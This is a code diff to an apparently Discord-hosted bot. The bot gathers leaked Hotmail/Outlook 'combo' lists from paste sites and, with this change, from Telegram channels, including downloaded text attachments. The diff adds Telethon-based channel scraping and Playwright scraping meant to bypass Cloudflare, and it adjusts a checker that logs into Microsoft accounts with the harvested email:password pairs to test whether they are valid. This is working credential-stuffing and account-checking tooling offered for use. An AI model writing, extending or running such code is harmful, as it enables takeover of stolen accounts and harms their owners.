@@ -43,6 +43,11 @@ MS_DOMAINS = {"hotmail.com", "hotmail.co.uk", "hotmail.fr", "hotmail.de", "hotma
 PAGES_TO_SCAN    = 5
 ARCHIVE_URL      = "https://pasteview.com/paste-archive"
 PASTEDPW_URL     = "https://pasted.pw/recent.php"
+# Telegram channels to monitor (add channel usernames without @)
+TG_MONITOR_CHANNELS = os.environ.get("TG_MONITOR_CHANNELS", "").split(",")  # e.g. "channel1,channel2"
+TG_API_ID           = os.environ.get("TG_API_ID", "")
+TG_API_HASH         = os.environ.get("TG_API_HASH", "")
+TG_PHONE            = os.environ.get("TG_PHONE", "")
 SEEN_FILE        = "seen_urls.json"
 EMPTY_SCAN_ALERT = 10
 KEYWORDS         = ["hotmail", "hits", "mixed"]
@@ -251,8 +256,8 @@ def check_inbox_account(combo: str) -> tuple:
                 "Connection": "keep-alive"
             }, allow_redirects=True, timeout=15)
 
-        url_match  = re.search(r'urlPost":"([^"]+)"', r2.text)
-        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
+        url_match  = re.search(r'urlPost\":\"([^\"]+)\"', r2.text)
+        ppft_match = re.search(r'name=\\\"PPFT\\\" id=\\\"i0327\\\" value=\\\"([^\"]+)\"', r2.text)
         if not url_match or not ppft_match:
             return (combo, {})
 
@@ -365,9 +370,10 @@ def check_valid_account(combo: str) -> tuple:
                 "Connection": "keep-alive"
             }, allow_redirects=True, timeout=15)
 
-        url_match  = re.search(r'urlPost":"([^"]+)"', r2.text)
-        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
+        url_match  = re.search(r'urlPost\":\"([^\"]+)\"', r2.text)
+        ppft_match = re.search(r'name=\\\"PPFT\\\" id=\\\"i0327\\\" value=\\\"([^\"]+)\"', r2.text)
         if not url_match or not ppft_match:
+            import logging; logging.getLogger("mercury").warning(f"[CHECKER] No url/ppft for {email}")
             return (combo, False)
 
         post_url = url_match.group(1).replace("\\/", "/")
@@ -382,23 +388,27 @@ def check_valid_account(combo: str) -> tuple:
                 "Referer": r2.url
             }, allow_redirects=False, timeout=15)
 
-        if any(x in r3.text for x in ["account or password is incorrect", "Incorrect password", "Invalid credentials"]):
+        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
             return (combo, False)
         if any(x in r3.text for x in ["identity/confirm", "Abuse", "signedout", "locked"]):
             return (combo, False)
 
         location   = r3.headers.get("Location", "")
         if not location:
+            import logging; logging.getLogger("mercury").warning(f"[CHECKER] No location for {email} status:{r3.status_code}")
             return (combo, False)
         code_match = re.search(r'code=([^&]+)', location)
         if not code_match:
+            import logging; logging.getLogger("mercury").warning(f"[CHECKER] No code for {email} loc:{location[:80]}")
             return (combo, False)
 
         return (combo, True)
 
     except requests.exceptions.Timeout:
+        import logging; logging.getLogger("mercury").warning(f"[CHECKER] Timeout {email}")
         return (combo, False)
-    except Exception:
+    except Exception as ex:
+        import logging; logging.getLogger("mercury").warning(f"[CHECKER] Exception {email}: {ex}")
         return (combo, False)
 
 
@@ -429,31 +439,110 @@ async def run_inbox_checker(combos: list) -> dict:
     return service_map
 
 
-# ─── PASTED.PW ───────────────────────────────────────────────────────────────
-async def scrape_pastedpw(pages: int = 5) -> list[dict]:
-    """Scrape pasted.pw recent page using aiohttp."""
+# ─── TELEGRAM CHANNEL MONITOR ────────────────────────────────────────────────
+tg_client = None
+
+async def init_telegram_client():
+    """Initialize Telethon client."""
+    global tg_client
+    if not TG_API_ID or not TG_API_HASH or not TG_PHONE:
+        log.warning("Telegram monitor not configured — set TG_API_ID, TG_API_HASH, TG_PHONE")
+        return
+    try:
+        from telethon import TelegramClient
+        tg_client = TelegramClient("mercury_session", int(TG_API_ID), TG_API_HASH)
+        await tg_client.start(phone=TG_PHONE)
+        log.info("Telegram client connected")
+    except Exception as e:
+        log.error(f"Failed to init Telegram client: {e}")
+        tg_client = None
+
+
+async def scrape_telegram_channels() -> list[dict]:
+    """Scrape monitored Telegram channels for new keyword-matching messages."""
+    if not tg_client or not TG_MONITOR_CHANNELS or TG_MONITOR_CHANNELS == [""]:
+        return []
     found = []
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
-    async with aiohttp.ClientSession(headers=headers) as sess:
-        for page_num in range(1, pages + 1):
-            url = PASTEDPW_URL if page_num == 1 else f"{PASTEDPW_URL}?page={page_num}"
+    try:
+        from telethon.tl.types import MessageMediaDocument
+        for channel in TG_MONITOR_CHANNELS:
+            channel = channel.strip()
+            if not channel:
+                continue
             try:
-                async with sess.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
-                    html = await r.text(errors="ignore")
-                # Extract paste IDs and titles from anchor tags
-                matches = re.findall(r'href="view\.php\?id=(\d+)"[^>]*>\s*([^<]+?)\s*</a>', html)
-                for paste_id, title in matches:
-                    title = title.strip()
-                    if any(k in title.lower() for k in KEYWORDS):
-                        if not any(b in title.lower() for b in BLACKLIST):
-                            found.append({
-                                "title": title,
-                                "url": f"https://pasted.pw/view.php?id={paste_id}",
-                                "source": "pasted.pw"
-                            })
-                log.info(f"pasted.pw page {page_num}: {len(found)} match(es) so far")
+                async for msg in tg_client.iter_messages(channel, limit=50):
+                    if not msg.text and not msg.message:
+                        continue
+                    text = (msg.text or msg.message or "").strip()
+                    title_lower = text[:100].lower()
+                    if any(k in title_lower for k in KEYWORDS) and not any(b in title_lower for b in BLACKLIST):
+                        msg_url = f"tg://{channel}/{msg.id}"
+                        if msg_url not in posted_urls:
+                            # Extract combos directly from message text
+                            creds = extract_credentials(text)
+                            if creds:
+                                found.append({
+                                    "title": text[:60],
+                                    "url": msg_url,
+                                    "source": "telegram",
+                                    "content": "\n".join(creds)
+                                })
+                            # Also check for .txt file attachments
+                            elif msg.media and isinstance(msg.media, MessageMediaDocument):
+                                try:
+                                    data = await tg_client.download_media(msg, bytes)
+                                    raw = data.decode("utf-8", errors="ignore")
+                                    creds = extract_credentials(raw)
+                                    if creds:
+                                        found.append({
+                                            "title": text[:60] or f"tg_{channel}_{msg.id}",
+                                            "url": msg_url,
+                                            "source": "telegram",
+                                            "content": "\n".join(creds)
+                                        })
+                                except Exception as e:
+                                    log.error(f"Failed to download TG attachment: {e}")
+                log.info(f"Telegram @{channel}: {len(found)} match(es)")
             except Exception as e:
-                log.error(f"pasted.pw page {page_num} failed: {e}")
+                log.error(f"Failed to scrape Telegram @{channel}: {e}")
+    except Exception as e:
+        log.error(f"Telegram scrape error: {e}")
+    return found
+
+
+# ─── PASTED.PW ───────────────────────────────────────────────────────────────
+async def scrape_pastedpw(page, pages: int = 5) -> list[dict]:
+    """Scrape pasted.pw using Playwright to bypass Cloudflare."""
+    found = []
+    for page_num in range(1, pages + 1):
+        url = PASTEDPW_URL if page_num == 1 else f"{PASTEDPW_URL}?page={page_num}"
+        try:
+            await page.goto(url, wait_until="domcontentloaded", timeout=30000)
+            # Wait for CF to clear — keep waiting until links appear
+            await page.wait_for_selector('a[href*="view.php"]', timeout=15000)
+            await page.wait_for_timeout(500)
+            matches = await page.evaluate("""
+                (keywords, blacklist) => {
+                    const results = [];
+                    for (const a of document.querySelectorAll('a[href*="view.php"]')) {
+                        const title = (a.innerText || a.textContent || '').trim();
+                        const tl = title.toLowerCase();
+                        if (keywords.some(k => tl.includes(k)) && !blacklist.some(b => tl.includes(b))) {
+                            const m = a.href.match(/id=(\d+)/);
+                            if (m) results.push({
+                                title: title,
+                                url: 'https://pasted.pw/view.php?id=' + m[1],
+                                source: 'pasted.pw'
+                            });
+                        }
+                    }
+                    return results;
+                }
+            """, KEYWORDS, BLACKLIST)
+            found.extend(matches)
+            log.info(f"pasted.pw page {page_num}: {len(matches)} match(es)")
+        except Exception as e:
+            log.error(f"pasted.pw page {page_num} failed: {e}")
     return found
 
 
@@ -567,10 +656,25 @@ async def monitor_loop():
 
                 # ── Also scrape pasted.pw ─────────────────────────────
                 try:
-                    pw_found = await scrape_pastedpw(PAGES_TO_SCAN)
+                    pw_found = await scrape_pastedpw(page, PAGES_TO_SCAN)
                     found.extend(pw_found)
                 except Exception as e:
                     log.error(f"pasted.pw scrape failed: {e}")
+
+                # ── Also scrape Telegram channels ─────────────────────
+                try:
+                    tg_found = await scrape_telegram_channels()
+                    if tg_found:
+                        log.info(f"Telegram: {len(tg_found)} match(es)")
+                        for item in tg_found:
+                            if item["url"] not in posted_urls:
+                                posted_urls.add(item["url"])
+                                # Post content directly
+                                content_str = item.get("content", "")
+                                if content_str:
+                                    combined.append(content_str)
+                except Exception as e:
+                    log.error(f"Telegram channel scrape failed: {e}")
 
                 # Deduplicate and filter blacklisted titles
                 seen_this_run = set()
@@ -873,6 +977,7 @@ async def on_ready():
         log.info("Monitor already running after reconnect")
     if not watchdog.is_running():
         watchdog.start()
+    await init_telegram_client()
 
 @bot.event
 async def on_resumed():
@@ -882,6 +987,7 @@ async def on_resumed():
         log.info("Monitor restarted after resume")
     if not watchdog.is_running():
         watchdog.start()
+    await init_telegram_client()
 
 # ─── RUN ─────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
